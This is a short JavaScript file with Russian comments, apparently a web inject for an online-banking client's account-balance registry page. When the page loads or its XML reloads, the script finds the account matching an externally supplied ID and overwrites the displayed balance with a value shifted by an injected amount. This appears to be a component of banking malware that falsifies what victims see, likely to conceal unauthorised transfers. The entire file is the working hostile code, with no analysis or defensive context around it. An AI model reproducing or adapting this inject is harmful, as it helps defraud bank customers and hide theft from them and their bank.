/*Остаток по счетам, Документы из банка -> Выписки -> Показать реестр остатков по счетам*/
var new_balance;

$(document).ready(function(){
	/*Вызываем при загрузке документа*/
	changeBalance();
});

/*Вызывается при перегрузке XML*/
function fix()
{
	changeBalance();
}
/*Читаем XML, изменяем баланс на нужном счете*/
function changeBalance()
{
	if(!document.getElementById("ScData"))
		return;

	var xml = document.getElementById("ScData").XMLDocument;

	$(xml.documentElement.childNodes).each(function(){
		var $this = $(this);
		/*Если это нужный счет*/
		if($this.attr("B") == acc_id)
		{
			if(!new_balance)
				new_balance = moneyToFloat($this.attr("C"))+balance;
				
			/*Меняем баланс*/
			$this.attr("C", roundMoney(new_balance).toString());
		}
	});

}